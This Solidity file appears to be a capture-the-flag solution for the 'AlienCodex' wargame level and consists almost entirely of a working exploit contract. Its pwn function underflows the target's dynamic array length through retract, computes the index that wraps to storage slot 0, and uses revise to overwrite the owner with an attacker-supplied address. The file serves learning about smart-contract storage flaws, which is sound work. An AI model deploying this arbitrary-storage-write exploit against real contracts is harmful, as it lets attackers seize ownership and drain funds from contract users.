// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITarget {
    function make_contact() external;

    function record(bytes32 content) external;

    function retract() external;

    function revise(uint256 i, bytes32 content) external;
}

contract AlienCodex {
    function pwn(address payable target, address value) external payable {
        // access dynamic array value need to keccak256(slotNumber)
        uint256 slot1Index = uint256(keccak256(abi.encodePacked(uint256(1))));
        // solidity memory from 0 to 2**256 - 1 each 32 bytes
        // +1 for overflow to move index to slot 0
        // if +2 will move index to slot 1
        // if +3 will move index to slot 2 and so on.
        uint256 slot0Index = (2**256 - 1) - slot1Index + 1;

        ITarget(target).make_contact();

        ITarget(target).retract();

        ITarget(target).revise(slot0Index, bytes32(uint256(uint160(value))));
    }
}
